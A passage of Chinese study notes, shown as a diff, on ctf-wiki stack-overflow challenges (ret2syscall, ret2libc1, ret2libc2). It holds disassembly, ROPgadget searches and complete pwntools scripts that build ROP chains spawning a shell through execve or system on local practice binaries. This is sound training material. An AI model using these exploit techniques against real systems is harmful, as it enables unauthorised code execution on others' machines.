@@ -6,13 +6,27 @@
 
 使用seveng0佬的pwn ubuntu16虚拟机做题
 
+shellcode参考
+
+https://shell-storm.org/shellcode/index.html
+
+在线编写shellcode
+
+https://shell-storm.org/online/Online-Assembler-and-Disassembler/
+
+系统调用号在线查询链接：https://syscalls.w3challs.com/
+
+arm64查询链接：https://syscall.sh/
+
+默认学过汇编且有一定逆向基础，熟悉运用AI辅助。
+
 ## 0. 相关术语
 
 **返回导向编程** (Return Oriented Programming)
 
-小片段 gadgets 通常是以 `ret` 结尾的指令序列
+**程序中已有的代码片段** gadgets 通常是以 `ret` 结尾的指令序列
 
-shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。
+用于完成某个功能的汇编代码 shellcode，常见的功能主要是获取目标系统的 shell。
 
 
 
@@ -248,5 +262,304 @@ checksec rop
     PIE:      No PIE (0x8048000)
 ```
 
+32位程序，开启了NX保护(又称DEP保护，数据执行保护)。
 
+ida打开
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+1Ch] [ebp-64h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("This time, no system() and NO SHELLCODE!!!");
+  puts("What do you plan to do?");
+  gets(&v4);
+  return 0;
+}
+```
+
+
+
+同理可知v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。
+
+比如
+
+```assembly
+#execve("/bin/sh",NULL,NULL)
+#查看linux_x86调用表
+#系统调用号，即 eax 应该为 0xb
+#第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
+#第二个参数，即 ecx 应该为 0
+#第三个参数，即 edx 应该为 0
+```
+
+
+
+我们需要使用**程序中已有的代码片段**`gadgets`来控制寄存器的值。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。
+
+首先，寻找控制eax的gadgets
+
+```bash
+ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
+```
+
+![image-20250214135132754](./ctf-wiki pwn刷题.assets/image-20250214135132754.png)
+
+上面几个都可以控制eax寄存器，我这里选择第二个作为gadgets
+
+```bash
+ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
+```
+
+
+
+选择`0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret`，可以同时控制edx,ecx,ebx
+
+![image-20250214135841153](./ctf-wiki pwn刷题.assets/image-20250214135841153-1739512723129-1.png)
+
+
+
+寻找`/bin/sh`字符串位置
+
+```bash
+ROPgadget --binary rop --string  '/bin/sh'
+```
+
+寻找`int 0x80`的位置
+
+```bash
+ROPgadget --binary rop --only 'int'
+```
+
+![image-20250214140227571](./ctf-wiki pwn刷题.assets/image-20250214140227571.png)
+
+
+
+构造payload
+
+```python
+from pwn import *
+p= process('./rop')
+
+pop_eax_ret=0x080bb196
+pop_edx_ecx_ebx_ret=0x0806eb90
+int_0x80=0x08049421
+binsh=0x080be408
+
+payload=flat(['A'*112,pop_eax_ret,0xb,pop_edx_ecx_ebx_ret,0,0,binsh,int_0x80])
+p.sendline(payload)
+p.interactive()
+```
+
+![image-20250214141408868](./ctf-wiki pwn刷题.assets/image-20250214141408868.png)
+
+或者使用`pwntools`的`ROP`模块
+
+```python
+from pwn import *
+# 启动目标程序
+p = process('./rop')
+# 加载二进制文件
+context.binary = './rop'
+rop = ROP(context.binary)
+# 查找 gadgets 和字符串
+pop_eax_ret = rop.find_gadget(['pop eax', 'ret'])[0]
+pop_edx_ecx_ebx_ret = rop.find_gadget(['pop edx', 'pop ecx', 'pop ebx', 'ret'])[0]
+int_0x80 = rop.find_gadget(['int 0x80'])[0]
+binsh = next(context.binary.search(b'/bin/sh'))
+
+# 构造 ROP 链
+# flat() 的主要功能是将多个数据项（如整数、字符串、列表等）拼接成一个连续的字节序列。
+payload = flat(
+    b'A' * 112,  # 填充缓冲区
+    pop_eax_ret, 0xb,  # eax = 11 (execve 系统调用号)
+    pop_edx_ecx_ebx_ret, 0, 0, binsh,  # edx = 0, ecx = 0, ebx = binsh
+    int_0x80  # 触发系统调用
+)
+
+# 发送 payload
+p.sendline(payload)
+# 切换到交互模式
+p.interactive()
+```
+
+
+
+
+
+### 4. ret2libc
+
+ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system("/bin/sh")，故而此时我们需要知道 system 函数的地址。
+
+
+
+**例1：ret2libc1**
+
+
+
+```bash
+seveng0@ubuntu:~/Desktop/pwn$ checksec ./ret2libc1
+[*] '/home/seveng0/Desktop/pwn/ret2libc1'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+32位程序开启了NX保护，没开RELRO(重定位只读)，可以覆盖`.got.plt`中的条目指向恶意代码。
+
+ida打开
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("RET2LIBC >_<");
+  gets(s);
+  return 0;
+}
+```
+
+找一下字符串
+
+```bash
+ROPgadget --binary ./ret2libc1  --string "/bin/sh"
+Strings information
+============================================================
+0x08048720 : /bin/sh
+```
+
+![image-20250214222523825](./ctf-wiki pwn刷题.assets/image-20250214222523825.png)
+
+alt+T找到system函数
+
+![image-20250214215520709](./ctf-wiki pwn刷题.assets/image-20250214215520709.png)
+
+
+
+![image-20250214202907338](./ctf-wiki pwn刷题.assets/image-20250214202907338.png)
+
+
+
+如上图所示，
+
+- `.plt:08048460` 是 `system` 函数在 PLT 中的地址，编译时就已经确定，并且在程序运行时不会改变。
+- `.got.plt:0804A018` 是 `system` 函数在 GOT 中的条目，在程序启动时，GOT 中的条目可能还没有被动态链接器填充。
+
+
+
+当你调用 `system` 函数时，
+
+1. 首先会调用`call system@plt`
+
+2. 执行`system@plt`
+
+```assembly
+.plt:08048460  FF 25 18 A0 04 08     jmp    ds:off_804A018  ; 跳转到 GOT 中的条目
+.plt:08048466  68 18 00 00 00        push    18h             ; 压入重定位索引
+.plt:0804846B E9 B0 FF FF FF         jmp     sub_8048420        ; 跳转到 PLT0
+```
+
+- 如果 GOT 中的条目已经被动态链接器填充，`off_804A018` 会直接指向 `system` 函数的真实地址，成功执行函数。
+- 如果 GOT 中的条目还未被填充，`off_804A018` 会指向 PLT 中的解析逻辑(从`08048466`开始继续执行)
+
+3. 跳转执行PLT0
+
+```assembly
+.plt:08048420 FF 35 04 A0 04 08      push    ds:dword_804A004 ; 压入 GOT[1]
+.plt:08048426 FF 25 08 A0 04 08      jmp     ds:dword_804A008 ; 跳转到动态链接器
+```
+
+4. 动态链接器解析 `system` 的地址：
+   - 动态链接器根据重定位索引（`18h`）和 GOT[1] 的值，找到 `system` 函数的真实地址。
+   - 动态链接器将 `system` 的地址写入 GOT 中的条目（`off_804A018`）。
+
+5. 跳转到 `system` 的真实地址，并且后续程序再次跳转到 `system@plt` 时，`jmp ds:off_804A018` 会直接跳转到 `system` 函数的真实地址。
+
+
+
+这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 `'bbbb'` 作为虚假的地址，其后参数对应的参数内容。
+
+```
+|-------------------|
+|    /bin/sh 地址   |  <- system 的参数 (arg1)
+|-------------------|
+|    虚假返回地址   |  <- system 的返回地址 (可以是任意值，如 'bbbb')
+|-------------------|
+|    system 地址    |  <- 覆盖的返回地址，跳转到 system 函数
+|-------------------|
+|    垃圾数据       |  <- 填充缓冲区，覆盖栈空间
+|-------------------|
+```
+
+
+
+```python
+from pwn import *
+p=process("./ret2libc1")
+system_plt=0x08048460
+#填system函数在PLT中的地址，因为PLT表编译时就已经确定，并且在程序运行时不会改变，
+#若GOT表未初始化，PLT会自动调用动态链接器找到函数真实地址，
+#填入GOT表并调用函数
+binsh=0x08048720
+
+payload=flat([b'a'*112,system_plt,binsh])
+p.sendline(payload)
+p.interactive()
+```
+
+
+
+![image-20250214223304558](./ctf-wiki pwn刷题.assets/image-20250214223304558.png)
+
+
+
+**例2：ret2libc2**
+
+该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。
+
+````python
+from pwn import *
+p=process("./ret2libc2")
+
+gets_plt = 0x08048460
+system_plt = 0x08048490
+pop_ebx = 0x0804843d
+buf2 = 0x804a080
+
+payload=flat([b'a'*112,gets_plt,pop_ebx,buf2,system_plt,b'b'*4,buf2])
+#来梳理一下上行代码的执行顺序
+#1.首先栈溢出先覆盖完ebp，然后覆盖函数返回值为gets_plt
+#2.执行gets_plt，将buf2作为第一个参数，返回地址为pop_ebx之后的system_plt，
+#pop_ebx是为了平衡堆栈，用来把用完的buf2给弹出堆栈，这样ret的时候能正确指向system函数
+#3.执行system_plt函数，4字节垃圾数据作为假的返回地址，buf2作为第一个参数
+
+p.sendline(payload)
+
+p.interactive()
+````
+
+
+
+![image-20250215001143967](./ctf-wiki pwn刷题.assets/image-20250215001143967.png)
+
+
+
+```python
+# 附加 GDB 调试
+gdb.attach(p, """
+    break *gets      
+    break *system    
+    continue             
+""")
+# 在 gets 函数处设置断点
+# 在 system 函数处设置断点
+# 继续执行
+```
 
